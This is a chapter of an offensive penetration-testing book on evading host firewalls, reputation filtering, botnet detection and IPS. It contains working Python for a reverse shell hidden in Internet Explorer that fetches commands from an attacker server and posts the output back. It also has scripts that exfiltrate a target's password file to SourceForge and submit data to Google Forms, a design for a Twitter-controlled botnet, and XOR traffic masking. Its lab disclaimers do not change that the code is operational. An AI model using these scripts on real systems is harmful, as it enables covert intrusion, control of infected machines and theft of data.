<html><head></head><body>
        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Catch Me If You Can!</h1>
                
            
            <article>
                
<p class="calibre2">In today's world, bypassing and hijacking software is all over the internet. However, clear usage and execution is what makes you a good amateur hacker.</p>
<p class="calibre2">This can be achieved by choosing your tools correctly and following the necessary processes to complete the tasks at hand impeccably.</p>
<p class="calibre2">In this chapter, we'll cover the following topics to help you achieve this:</p>
<ul class="calibre9">
<li class="calibre10">Bypassing host-based firewalls</li>
<li class="calibre10">Hijacking IE</li>
<li class="calibre10">Bypassing repudiation filtering</li>
<li class="calibre10">Interacting with SourceForge</li>
<li class="calibre10">Interacting with Google Forms</li>
<li class="calibre10">Bypassing botnet filtering</li>
<li class="calibre10">Bypassing IPS with handmade XOR encryption</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Bypassing host-based firewalls</h1>
                
            
            <article>
                
<p class="calibre2">In all our previous chapters, we assumed that any process on the target machine can initiate a session to the internet without any restrictions. Now, in many enterprise networks, they don't rely on the built-in Windows Firewall. Instead, they use an advanced host-based firewall to limit what process can initiate a session to the internet, just like how the access lists work. So, for instance, let's assume that the system administrator has allowed only some business-needed processes to access the internet. For example, let's say that the system <span class="calibre11">administrator</span> allowed the Windows update and the antivirus update, as well as the most common browsers, such as Chrome, Internet Explorer, and Firefox. So, only these processes are allowed to reach over the internet; any other process will be blocked. By implementing such a policy, our backdoor has no chance to survive since it won't be listed in the administrator list by default. Eventually, we don't get any shell to the attacker machine.</p>
<p class="calibre2">However, if we find a way to<span class="calibre11"> somehow</span> control <strong class="calibre4">Internet Explorer</strong> (<strong class="calibre4">IE</strong>) on our behalf using our Python script and then force it to connect to our Kali HTTP server in the background and transfer commands back and forth, then we can bypass the host-based firewall policy here. Microsoft offers <strong class="calibre4">Component Object Model</strong> (<strong class="calibre4">COM</strong>) to enable interprocess communication and programmatically create an object to control and automate multiple Microsoft products, such as Outlook, Internet Explorer, Word, and Excel. Internet Explorer is a built-in browser in all Windows versions; so, it should be available all the time in our target and is usually whitelisted to security administrators as it is considered as a backup browser in case other browsers fail. Another benefit of making Internet Explorer initiate the connection on our behalf is if the target was using an internal proxy before connecting to the internet, then you don't have to worry about knowing the proxy information as Internet Explorer will take care of this on our behalf.</p>
<p class="calibre2">So, what we'll do here is we'll assume that the host-based firewall only allows some process such as antivirus, Firefox, Internet Explorer, or Windows Update, and nothing else. In response to this, in our Python script, we will define a COM object to control Internet Explorer. Then, we will make Internet Explorer navigate to our HTTP server, which is located on the Kali machine, and get the command to execute it.</p>
<p class="calibre2">Once we get the command that we need to execute, we will initiate a subprocess. We retrieve the command to EXE. Then, using the COM object, we will take it back using our Python script and initiate the <kbd class="calibre12">cmd.exe</kbd> as a subprocess. The result for the command, using the COM object we will pass it to Internet Explorer and then post it to our website, which is located on the Kali machine here. If you remember, this technique is very similar to our previous HTTP reverse shell, but the key difference here is that we use Internet Explorer as our web client instead of using the <kbd class="calibre12">requests</kbd> library, as we did earlier. The end result, from the host-based firewall's perspective, is that the Python script did not initiate any session to the outside world, it was Internet Explorer.</p>
<div class="packt_infobox">The following link will provide more insight on COM protocol:  <a href="http://claudihome.com/html/LR/WebHelp/Content/VuGen/132800_click_and_script.htm" class="calibre6"><span>http://claudihome.com/html/LR/WebHelp/Content/VuGen/132800_click_and_script.htm</span>.</a></div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Hijacking IE</h1>
                
            
            <article>
                
<p class="calibre2">As always, coding with Python will make your life much easier. Now, to use COM in Python, you just need a Python for Windows or <kbd class="calibre12">pywin</kbd> library. Since we've already installed this library while creating our previous key-logger, we won't cover that again here. Now, let's jump to the coding part:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Install Python for Windows pywin32-219.win32-py2.7<br class="title-page-name"/># http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/<br class="title-page-name"/><br class="title-page-name"/># Hijacking IE - Shell Over IE<br class="title-page-name"/><br class="title-page-name"/>from win32com.client import Dispatch<br class="title-page-name"/>from time import sleep<br class="title-page-name"/>import subprocess<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>ie = Dispatch("InternetExplorer.Application") # Create browser instance.<br class="title-page-name"/>ie.Visible = 0 # Make it invisible [ run in background ] (1= invisible)<br class="title-page-name"/>...</pre>
<p class="calibre2">Here, we start by creating an <kbd class="calibre12">InternetExplorer</kbd> object instance and set the Visible option to 0, which means that Internet Explorer will run in the background.</p>
<div class="packt_infobox">If we set the value to 1, then Internet Explorer window will show up to the target desktop and this is something we don't want.</div>
<pre class="packt_figure">...<br class="title-page-name"/># Paramaeters for POST<br class="title-page-name"/>dURL = "http://10.10.10.100"<br class="title-page-name"/>Flags = 0<br class="title-page-name"/>TargetFrame = ""<br class="title-page-name"/><br class="title-page-name"/>while True:<br class="title-page-name"/><br class="title-page-name"/>    ie.Navigate("http://10.0.10.100") # Navigate to our kali web server to grab the hacker commands<br class="title-page-name"/>    <br class="title-page-name"/>    while ie.ReadyState != 4: # Wait for browser to finish loading.<br class="title-page-name"/>        sleep(1)<br class="title-page-name"/>                <br class="title-page-name"/><br class="title-page-name"/>    command = ie.Document.body.innerHTML<br class="title-page-name"/>    <br class="title-page-name"/>    command = unicode(command) # Converts HTML entities to unicode. For example '&amp;amp;' becomes '&amp;'<br class="title-page-name"/>    command = command.encode('ascii','ignore') # encode the command into ASCII string and ignore any exception<br class="title-page-name"/>    print ' [+] We received command ' + command<br class="title-page-name"/><br class="title-page-name"/>    if 'terminate' in command: # if the received command was terminate<br class="title-page-name"/>        ie.Quit() # quit the IE and end up the process <br class="title-page-name"/>        break # end the loop<br class="title-page-name"/><br class="title-page-name"/>    else: # if the received command was NOT terminate then we inject the command into a shell and store the result in a variable called Data<br class="title-page-name"/>        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)<br class="title-page-name"/><br class="title-page-name"/>        Data = CMD.stdout.read()<br class="title-page-name"/>        PostData = buffer( Data ) # in order to submit or post data using COM technique , it requires to buffer the data first<br class="title-page-name"/>                                  # https://docs.python.org/2/library/functions.html#buffer<br class="title-page-name"/>        ie.Navigate( dURL, Flags, TargetFrame, PostData ) # we post the comamnd execution result along with the post parameters which we defined earlier..<br class="title-page-name"/><br class="title-page-name"/>    sleep(3)</pre>
<p class="calibre2">Next, we start by going into an infinite loop, and navigate to our Kali IP address. We will wait for the browser to finish loading. If the browser doesn't load the page entirely, we will sleep for one second. Note that, when the browser has finished loading, <kbd class="calibre12">ReadyState</kbd> will have a value of <kbd class="calibre12">4</kbd> and the second loop will be terminated.</p>
<p class="calibre2">Next, we retrieve the HTML page into a variable called <kbd class="calibre12">command</kbd>; then, we convert the HTML entities into <kbd class="calibre12">unicode</kbd>. Finally, we encode the command into ASCII string and ignore any exception, which may have occurred while doing so. The final result will be the command that we should execute and we will print it out. As with our previous shells, if we get a <kbd class="calibre12">terminate</kbd> command from the Kali machine, we will quit Internet Explorer instance and <kbd class="calibre12">break</kbd> the loop. If the command was not terminated, then we inject the command into a shell and store the result in a variable called <kbd class="calibre12">Data</kbd>. Now, in order to submit or post the <kbd class="calibre12">Data</kbd> using the COM technique, it requires to <kbd class="calibre12">buffer</kbd> the <kbd class="calibre12">Data</kbd> first, and we used a built-in Python <kbd class="calibre12">buffer()</kbd> function to do so. Then, at the end, we post the command execution result along with the <kbd class="calibre12">POST</kbd> parameters, which we defined earlier. We have never used <kbd class="calibre12">Flags</kbd> or <kbd class="calibre12">TargetFrame</kbd>, so we set them to their default values. The main parameter here is the <kbd class="calibre12">dURL</kbd>, which defines the destination URL that we wish to submit the data for.</p>
<p class="calibre2">Let's jump to the attacker side a little bit and here we had the exact HTTP web server that we used earlier in our HTTP reverse shell. After starting the script on the target side, Internet Explorer will start in the background, as we can see from the Windows Task Manager's <span class="calibre11">Processes</span> tab in the following screenshot:</p>
<div class="packt_figure1"><img src="../images/00050.jpeg" class="calibre33"/></div>
<p class="calibre2">As you can see, it's totally invisible to the user. The IE is running, but as we can see, the GUI is not showing up in the <span class="calibre11">Applications</span> tab. On executing <kbd class="calibre12">ipconfig</kbd> on the Kali machine, at the victim side, we get the <kbd class="calibre12">ipconfig</kbd> <span class="calibre11">command</span>. Let's go for directories and other commands. You can also perform a quick <kbd class="calibre12">ping 10.10.10.100</kbd>:</p>
<pre class="packt_figure"><strong class="calibre1">dir<br class="title-page-name"/>cd<br class="title-page-name"/>whoami</strong><br class="title-page-name"/><strong class="calibre1">arp -a</strong><br class="title-page-name"/><strong class="calibre1">ping 10.10.10.100</strong></pre>
<p class="calibre2">The outputs will be similar to the following:</p>
<pre class="packt_figure">[+] We received command ipconfig<br class="title-page-name"/>[+] We received command dir<br class="title-page-name"/>[+] We received command cd<br class="title-page-name"/>[+] We received command whoami<br class="title-page-name"/>[+] We received command arp -a<br class="title-page-name"/>[+] We received command ping 10.10.10.100</pre>
<p class="calibre2">We got our shell fully functional here. So, one more time, let's just explain what just happened here:</p>
<ul class="calibre9">
<li class="calibre10">Our Python script has initiated an Internet Explorer process in the background and we have used Internet Explorer to navigate to our command and control the server on the Kali side.</li>
<li class="calibre10">Then, we transferred the data using <kbd class="calibre12">GET</kbd> and <kbd class="calibre12">POST</kbd> back and forth between them.</li>
<li class="calibre10">Now, at the end, note that it's not only limited to a shell. You can also transfer files and submit data using COM protocol.</li>
<li class="calibre10">We will leave it to you to discover the other features that you can do with a COM protocol.</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Bypassing reputation filtering in next generation firewalls</h1>
                
            
            <article>
                
<p class="calibre2">Next-generation firewalls are all-in-one firewalls. They have all the security features, such as IPS, antivirus, anti-spam, and reputation filtering, in a single box. In this section, we will discuss a major security feature, which can prevent us from getting our shell on our target. Now, let's assume that we were able to plant our Python reverse shell successfully on our target machine. Now, in a traditional firewall, if the <strong class="calibre4">access control list</strong> (<strong class="calibre4">ACL</strong>) was allowing the traffic to the outside, then we will get our shell back successfully. But if the firewall was doing reputation filtering, then what will happen is that once the client initiates a session back to our Kali machine and reaches the firewall, the firewall will do a lookup and check on the destination IP. Then, it checks whether the destination IP belongs to a malicious site. This checking is based on an IP pool, which is a list of an IP that the firewall will download from the vendor database. So, if this is a Cisco firewall, it will use a Cisco database. If this firewall was a Palo Alto, it would use a Palo Alto pool. This database or a pool contains a large list of IPs with its reputation rank.</p>
<p class="calibre2">For example, let's say in the IP or in the database we have an IP of <kbd class="calibre12">1.1.1.1</kbd> and it has a rank of <kbd class="calibre12">10</kbd>, which means it can totally be trusted. Also, we have an IP of <kbd class="calibre12">2.2.2.2</kbd>, which has a low rank of <kbd class="calibre12">2</kbd>. This means that it has been reported as a malicious IP. Let's say that the attacker IP address was <kbd class="calibre12">3.3.3.3</kbd>. When the initiated session reaches the firewall with the destination IP address of <kbd class="calibre12">3.3.3.3</kbd>, if this IP was not whitelisted and has a low rank in the IP database, then the firewall will drop the traffic and log the decision to the administrator.</p>
<p class="calibre2">The idea here is to use a server or website such as Google Forms to submit a text or maybe to use SourceForge to upload the files. The benefit of doing so is, firstly, these two servers or services are very well-known and have a high reputation rank out of <kbd class="calibre12">10</kbd>. So, we are expecting to see <a href="https://www.google.com" class="calibre8">https://www.google.com</a> or Google Forms in the IP pool or on the IP database with a rank of <kbd class="calibre12">10</kbd>. Secondly, it may have never been flagged as suspicious to the security administrator or to anyone watching the traffic in real time.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Interacting with SourceForge</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will see how easily we can upload files to SourceForge. SourceForge is usually whitelisted from the reputation filtering perspective and probably never looked by security administrators. SourceForge provides multiple ways to interact with its repository. We will be using SCP, which is transferring the file over an SSH session. Now, creating an account in SourceForge is easy and hence we will skip this part. Before we start, take a minute and read the SourceForge documentation for using SCP and the format needed, <a href="https://sourceforge.net/p/forge/documentation/SCP/" class="calibre8">https://sourceforge.net/p/forge/documentation/SCP/</a>. I'll log into my account, which I have already created and proceed to my profile. There, I have created a project called <kbd class="calibre12">Test</kbd> with zero files currently.</p>
<p class="calibre2">Let's go to the coding part right now. We will be using two libraries to get our job done:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Interacting with SourceForge<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>import paramiko # pip install paramiko<br class="title-page-name"/>import scp # download link: https://pypi.python.org/pypi/scp<br class="title-page-name"/>...</pre>
<p class="calibre2">The first library is <kbd class="calibre12">paramiko</kbd>.  <kbd class="calibre12">paramiko</kbd> is a Python implementation of the SSHv2 protocol, providing both client and server functionality. The <kbd class="calibre12">scp</kbd> is a higher library built over <kbd class="calibre12">paramiko</kbd> that is used to transfer the file in just a matter of a single line.</p>
<p class="calibre2"><span class="calibre11">Before using any of these libraries, a prerequisite library called</span><span class="calibre11"> </span><kbd class="calibre12">PyCrypto</kbd><span class="calibre11"> </span><span class="calibre11">has to be installed first from <a href="http://www.voidspace.org.uk/python/modules.shtml#pycrypto" class="calibre8">http://www.voidspace.org.uk/python/modules.shtml#pycrypto</a></span>.<span class="calibre11"> The steps are rather straight forward.</span></p>
<p class="calibre2"><span class="calibre11">The n</span><span class="calibre11">ext step is to install</span><span class="calibre11"> </span><kbd class="calibre12">paramiko</kbd><span class="calibre11"> </span><span class="calibre11">using the</span><span class="calibre11"> </span><kbd class="calibre12">pip</kbd><span class="calibre11"> </span><span class="calibre11">command:</span></p>
<pre class="packt_figure"><strong class="calibre1">pip install paramiko</strong></pre>
<p class="calibre2">The last step is to install the<span class="calibre11"> </span><kbd class="calibre12">scp</kbd><span class="calibre11"> </span>library. <span class="calibre11">If you face any problems with the library setup script, simply copy the library manually into Python site-packages directory. Simply paste the</span><span class="calibre11"> </span><span class="calibre11">scp </span><span class="calibre11">script by navigating to </span><span class="calibre11">Python27</span><span class="calibre11"> </span><span class="calibre11">|</span><span class="calibre11"> </span><span class="calibre11">Lib</span><span class="calibre11"> </span><span class="calibre11">|</span><span class="calibre11"> </span><span class="calibre11">site-packages</span>.</p>
<p class="calibre2">Lets look into rest of the script:</p>
<pre class="packt_figure">...<br class="title-page-name"/>ssh_client = paramiko.SSHClient() # creating an ssh_client instance using paramiko sshclient class<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>'''<br class="title-page-name"/>when you connect to an ssh server at the first time, if the ssh server keys are not stores on the client side, you will get a warning<br class="title-page-name"/>message syaing that the server keys are not chached in the system and will prompt whether you want to accept those keys.<br class="title-page-name"/><br class="title-page-name"/>since we do an automation on the target side, we inform paramiko to accept these keys for the first time without interrupting the session or<br class="title-page-name"/>prompting the user and this done via &gt; set_missing_host_key_policy(paramiko.AutoAddPolicy()<br class="title-page-name"/>'''<br class="title-page-name"/><br class="title-page-name"/>ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>ssh_client.connect("web.sourceforge.net", username="hkhrais", password="[123justyouandme]") #Authenticate ourselves to the sourceforge server<br class="title-page-name"/>print '[+] Authenticating against web.sourceforge.net ...' #please use your own login credentials :D<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>scp = scp.SCPClient(ssh_client.get_transport()) #after a successful authentication the ssh session id will be passed into SCPClient function<br class="title-page-name"/><br class="title-page-name"/>scp.put('C:/Users/Hussam/Desktop/password.txt') # upload to file( in this case it's password.txt) that we want to grab from the target to /root directory<br class="title-page-name"/>print '[+] File is uploaded '<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>scp.close()<br class="title-page-name"/>print '[+] Closing the socket'</pre>
<p class="calibre2">So, our script will start with creating an <kbd class="calibre12">ssh_client</kbd> instance using the <kbd class="calibre12">paramiko.SSHClient()</kbd> class. Now, when you connect to an SSH server for the first time and if the SSH server keys are not stored on the client side, you will get a warning message saying that the server keys are not cached in the system; it will prompt you to accept these keys.</p>
<p class="calibre2">Open <span class="calibre11">PuTTY</span> software, connect to the SourceForge server with <kbd class="calibre12">web.sourceforge.net</kbd> as the hostname, port <kbd class="calibre12">22</kbd>, and protocol <span class="calibre11">SSH</span>. Now, click on <span class="calibre11">Open</span>:</p>
<div class="packt_figure1"><img src="../images/00051.jpeg" class="calibre58"/></div>
<p class="calibre2">We will get a warning pop up because the keys are not cached in the system. Now, since we perform an automation, we will inform <kbd class="calibre12">Paramiko</kbd> to accept these keys for the first time without interrupting the session or prompting the user for it. This will be done via  <kbd class="calibre12">client.set_missing_host_key_policy</kbd>, then <kbd class="calibre12">AutoAddPolicy()</kbd>.</p>
<p class="calibre2">The next step in the code block is to define the SourceForge server name that we want to connect and upload our file to. Also, we provide the login credentials. After providing <kbd class="calibre12">username</kbd> and <kbd class="calibre12">password</kbd>, we will authenticate ourselves to the SourceForge server. After a successful authentication, the SSH session ID will be passed to the <kbd class="calibre12">SCPClient()</kbd> function and the <kbd class="calibre12">get_transport()</kbd> function will return the session ID for us. Now, after performing this step, all we have to do is specify the file path that we want to exfiltrate and upload it to our repository.</p>
<p class="calibre2">In this example, I have used Module 5 or the <kbd class="calibre12">M5.pdf</kbd> file. So, we will use the <kbd class="calibre12">put()</kbd> function from the SCP to perform the upload and in the end we will close the session using the <kbd class="calibre12">.close()</kbd> function.</p>
<p class="calibre2">After running the script, we will get a successful authentication message as follows:</p>
<pre class="packt_figure"><strong class="calibre1">&gt;&gt;&gt;</strong><br class="title-page-name"/><strong class="calibre1">[+] Authenticating against web.sourceforge.net ...</strong><br class="title-page-name"/><strong class="calibre1">[+] File is uploaded</strong><br class="title-page-name"/><strong class="calibre1">[+] Closing the socket</strong><br class="title-page-name"/><strong class="calibre1">&gt;&gt;&gt;</strong></pre>
<p class="calibre2">Now, let's jump to the attacker side and verify that we got the file. First, install FileZilla FTP client to access our repository:</p>
<pre class="packt_figure"><strong class="calibre1">apt-get install filezilla <br class="title-page-name"/></strong></pre>
<p class="calibre2">Open the software by running <kbd class="calibre12">filezilla</kbd> and enter the name of the server/hostname, username, password, and port number, as entered previously in the script to log into your account. A warning message will be presented because we have logged in for the first time, and if we scroll a little bit we can see that we got our file. <kbd class="calibre12">M5</kbd> has been uploaded here successfully as shown in the following screenshot:</p>
<div class="packt_figure1"><img src="../images/00052.jpeg" class="calibre59"/></div>
<p class="calibre2">Try to download this file by right-clicking on the filename and selecting <span class="calibre11">Download</span>. The console prints that the file has been transferred successfully in the absence of errors.</p>
<p class="calibre2">Now, repeat the preceding steps for a <kbd class="calibre12">.txt</kbd> extension to check whether you're successful. Refresh the attacker side and view the contents. Make sure to remove the files from your SourceForge repository once the penetration testing assessment is finished.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Interacting with Google Forms</h1>
                
            
            <article>
                
<p class="calibre2">In the previous section, we have seen how we can exfiltrate data into the SourceForge website. Now, we will use Google Forms to submit normal text. Note that this text could be a command execution output for our shell. The point here is, similar to SourceForge, Google Forms has a pretty high reputation rank. Follow these steps to get started:</p>
<ol class="calibre13">
<li value="1" class="calibre10">Log in to Google Forms</li>
<li value="2" class="calibre10">Create a new Google form by clicking <span>Start a new form</span></li>
<li value="3" class="calibre10">Type the <span>Question</span> as <kbd class="calibre12">Isn't Python awesome?</kbd></li>
<li value="4" class="calibre10">In the <span>Response</span> tab keep the default name for the spreadsheet</li>
<li value="5" class="calibre10">Change type of the <span>Question</span> to <span>Paragraph</span> from the default <span>Multiple choice</span></li>
<li value="6" class="calibre10">Once the form is created, click on <span>Send</span></li>
<li value="7" class="calibre10">Copy the link that is provided to a Notepad or a text file</li>
<li value="8" class="calibre10">Go to the link we copied and submit a trivial text</li>
<li value="9" class="calibre10">Check the response in the Google Sheet that we created, which will be in your Google Drive by this time</li>
</ol>
<p class="calibre2">Now, we will code a Python script that will submit text data from the target side into our Google Form and the best part here is that we can accomplish that without having to log in into a Google account. Now, as usual, the best Python library to interact with web is <kbd class="calibre12">requests</kbd>and we have used <kbd class="calibre12">requests</kbd> in the previous sections:</p>
<pre class="packt_figure">'''<br class="title-page-name"/>Caution<br class="title-page-name"/>--------<br class="title-page-name"/>Using this script for any malicious purpose is prohibited and against the law. Please read Google terms and conditions carefully. <br class="title-page-name"/>Use it on your own risk. <br class="title-page-name"/>'''<br class="title-page-name"/><br class="title-page-name"/># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/># Interacting with Google Forms<br class="title-page-name"/><br class="title-page-name"/><br class="title-page-name"/>import requests # To install requests library, just type on the CMD: pip install requests<br class="title-page-name"/><br class="title-page-name"/>url = 'https://docs.google.com/forms/d/e/1FAIpQLSdNHreWMKC4li3a-Ox7IzQZ9mkZjI94I8U6jz8yHBkePXSPoA<span>/formResponse</span>' # please replace the URL with your own google form :D<br class="title-page-name"/><br class="title-page-name"/>'''<br class="title-page-name"/>notice that i added /formResponse to the end of the URL and this is inherited from the page HTML source code,<br class="title-page-name"/>as we can see below, the HTML form action contains /formResponse when method POST is used to send the user data<br class="title-page-name"/>so we have to add this part when we automate the data submission<br class="title-page-name"/>&lt;div class="ss-form"&gt;&lt;form action="https://docs.google.com/forms/d/1Ndjnm5YViqIYXyIuoTHsCqW_YfGa-vaaKEahY2cc5cs/formResponse?pli=1"<br class="title-page-name"/>method="POST" id="ss-form" target="_self" onsubmit=""&gt;&lt;ol role="list" class="ss-question-list" style="padding-left: 0"&gt;<br class="title-page-name"/>'''<br class="title-page-name"/><br class="title-page-name"/>form_data = {'entry.1542374001':'Hello from Python'}<br class="title-page-name"/><br class="title-page-name"/>r = requests.post(url, data=form_data)<br class="title-page-name"/># Submitting form-encoded data in requests:-<br class="title-page-name"/># http://docs.python-requests.org/en/latest/user/quickstart/#more-complicated-post-requests</pre>
<p class="calibre2">Once again, the installation is quite easy: it's just <kbd class="calibre12">pip install requests</kbd>. Now, what we see here is the <kbd class="calibre12">requests</kbd> documentation for submitting an HTML form-encoded <kbd class="calibre12">POST</kbd> request:</p>
<div class="packt_figure1"><img src="../images/00053.jpeg" class="calibre60"/></div>
<p class="calibre2">Now, as per the documentation, we first define the URL for the submit form and, in our case, it's the Google form URL. And the second parameter is our data in a dictionary format, where we have a <kbd class="calibre12">key</kbd> and a corresponding value. Keep in mind that the <kbd class="calibre12">key</kbd> is the form name and its value is our text data that we want to send.</p>
<p class="calibre2">Let's jump to our Google form link to discover the form name, which will be our <kbd class="calibre12">key</kbd> in the dictionary. Open the source code of the form that we created and, in HTML, search for the <kbd class="calibre12">Python</kbd> string. If you take a close look, you will catch the HTML form name for submitting a text. In our case, the form name which comes as the value of <kbd class="calibre12">&lt;textarea name&gt;</kbd> is <kbd class="calibre12"><span>entry.1542374001</span></kbd>:</p>
<div class="packt_figure1"><img src="../images/00054.gif" class="calibre33"/></div>
<p class="calibre2">At this point, we have discovered the <kbd class="calibre12">key</kbd> name, which is what we need to automate the process. Remember that the value is the data that we want to send or submit.</p>
<p class="calibre2">C<span class="calibre11">opy the form name on a Notepad file for now. Then, we have to g</span><span class="calibre11">o to the previous <kbd class="calibre12">Interacting with Google Forms</kbd> script and fill this information over there. First c</span><span class="calibre11">opy, the URL of the form and assign it to the <kbd class="calibre12">url</kbd> variable below the <kbd class="calibre12">import requests</kbd> line and, at the end, append</span> <kbd class="calibre12">/formResponse</kbd> after removing the <kbd class="calibre12">/viewform</kbd> part from the URL. <span class="calibre11">Put the form name, <kbd class="calibre12"><span>entry.1542374001</span></kbd> , as the key and t</span><span class="calibre11">he data for now will be</span> <kbd class="calibre12">Hello From Python</kbd>:</p>
<pre class="packt_figure">...<br class="title-page-name"/>url = 'https://docs.google.com/forms/d/e/1FAIpQLSdNHreWMKC4li3a-Ox7IzQZ9mkZjI94I8U6jz8yHBkePXSPoA<span>/formResponse</span>'<br class="title-page-name"/>...<br class="title-page-name"/>form_data = {'entry.1542374001':'Hello from Python'}<br class="title-page-name"/>...</pre>
<p class="calibre2"><span class="calibre11">Save the script. </span>At this point, we have everything in place. Let's run the script and if everything is working fine as expected, we should see <kbd class="calibre12">Hello From Python</kbd> added in our form response.</p>
<p class="calibre2">In the next section, we will see how we can use this script in real world penetration testing. </p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Bypassing botnet filtering</h1>
                
            
            <article>
                
<p class="calibre2">If you have read the previous sections in order, then at this point you should be able to grab a command over Twitter without the need to log into Twitter and submit a text into a Google form, also without logging into the Google account. Lastly, you should be able to upload files to SourceForge. So, you might be asking: what can a hacker do with these services?</p>
<p class="calibre2">Well, they can send a command such as <kbd class="calibre12">ipconfig</kbd> as a tweet and then they can make multiple infected targets to parse the tweet and execute the commands. After executing the commands, we get the execution results, which can be submitted to a Google form. Alternatively, if the command syntax or format was containing the <kbd class="calibre12">grab</kbd> keyword, then the target will upload the files into our SourceForge repository.</p>
<p class="calibre2">Now, in modern firewalls, the botnet filtering feature is looking for a certain criteria or parameter, like the application or protocol being used by the modern botnets such as IRC, Dynamic DNS, as well as the number of sessions created from the inside to the outside host. All of these will be considered by the modern or next-generation firewall to check whether this traffic belonged to a botnet or not. Also, there is no need to mention that the reputation filtering is also a part of these inspections and filtering.</p>
<p class="calibre2">The benefits for building a botnet based on well-known servers are that first, we don't use IRC channels or Dynamic DNS. Next, we don't have to interact or have a direct interaction with the attacker machine. The last point is that all of these servers or services are well known and trusted.</p>
<div class="packt_infobox">If you do abuse these services and use them out of the lab environment, you are violating the terms and agreement, and eventually you will be prosecuted to the full extent of law accordingly as per the jurisdiction prevalent in the concerned region.</div>
<p class="calibre2">Keep in mind that my point here is to open your eyes to similar types of attacks, so you can be aware of them. So, what I want you to do is challenge yourself and try to combine and squeeze all of these scripts into one advanced shell and then try to infect multiple virtual machines running Windows 7 within your home lab environment. After that, or finally, you will be able to control them and exfiltrate data. The last point which we didn't mention up to this section is the encryption. In the next section, we will see how easily to build XOR encryption and mask our clear-text traffic.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    </header><h1 class="header-title" id="calibre_pb_0">Bypassing IPS with handmade XOR encryption</h1>
                
            
            <article>
                
<p class="calibre2">In this section, we will build a simple XOR encryption in Python. Now, traffic encryption is one of the most powerful techniques to evade network analyzer or IPS sensors but first, before jumping into the coding part, let's have a quick overview on how these devices work in the first place.</p>
<p class="calibre2">Generally speaking, these devices can operate in two modes: the first mode, which is the <strong class="calibre4">signature-based mode</strong>, where it inspects the packet parameters and data payloads, which are passing through the sensor. Then, similar to an antivirus, it checks whether there is any match against its signature database and based on the action specified for the matched rule, it may drop or log the traffic. The second mode is <strong class="calibre4">behavior-based</strong> or <strong class="calibre4">anomaly-based</strong>, where you install the IPS in the network and it will learn the types of the protocol, as well as the packet rate passing through the sensor. Then, it'll build its database or its baseline database based on the current network traffic.</p>
<p class="calibre2">For instance, in a network, let's say that we have 50 PCs that usually use SSH to access a remote server. If the IPS is behavior-based, it will learn that on average we have 50 SSH sessions and it will create a baseline for this. Later on, if any PC has used Telnet, then the IPS will consider this protocol as a suspicious activity and may drop the bucket. Although the Telnet session is a legitimate one, but since the IPS during the learning phase did not notice any Telnet session, it won't be included in the IPS baseline and this incorrect behavior is called <strong class="calibre4">false positive</strong>. This is why behavior-based IPSes are not frequently used due to these false positives.</p>
<p class="calibre2">Now, we will code a very simple XOR encryption to mask our data payload. You're probably thinking: why an XOR encryption? Why not create a SSH or HTTPs shell, since these protocols provide encryption by design? Well, I do not recommend this because, in many enterprise networks, you may find your target has installed a decryption device where it can terminate the SSL and SSH. So basically, once the traffic comes into this device, it will convert or remove the encryption from these protocols and convert it into clear text before passing it to the IPS sensor for inspection. Technically, you won't have an end-to-end encryption shell and if you shall face this decrypter device, you won't have any added value.</p>
<div class="packt_infobox">Many modern firewalls or next-generation firewalls can terminate the SSL and SSH encryption for inspection purposes.</div>
<p class="calibre2">Let's jump to the coding part:</p>
<pre class="packt_figure"># Python For Offensive PenTest<br class="title-page-name"/><br class="title-page-name"/>import string # The random and string libraries are used to generate a random string with flexible criteria<br class="title-page-name"/>import random<br class="title-page-name"/><br class="title-page-name"/># XOR Encryption<br class="title-page-name"/><br class="title-page-name"/># Random Key Generator<br class="title-page-name"/><br class="title-page-name"/>key = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\$%&amp;/()=?{[]}+~#-_.:,;&lt;&gt;|\\') for _ in range(1024))<br class="title-page-name"/><br class="title-page-name"/># the for loop defines the key size, key size is 1 KB which if you remember in our TCP shell, it matches the TCP socket size :)<br class="title-page-name"/># the "".join will put the result for the random strings into a sequence and we finally will store it in a key variable <br class="title-page-name"/># so all in all the for loop will generate a 1024 random string which are matching our criteria and . join is used to gather these strings into a sequence<br class="title-page-name"/><br class="title-page-name"/>print key<br class="title-page-name"/>print '\n' + 'Key length = ' + str ( len(key) )<br class="title-page-name"/><br class="title-page-name"/># After we generate the XOR key, you need to take into consideration the XOR encryption rule which says the key length must be greater or equal the msg/data<br class="title-page-name"/># which we will send over the tunnel. len(key) &gt;= len(message) <br class="title-page-name"/><br class="title-page-name"/>message = 'ipconfig' # this is the message which we will encrypt before it's getting sent<br class="title-page-name"/>print "Msg is " + message + '\n'<br class="title-page-name"/>...</pre>
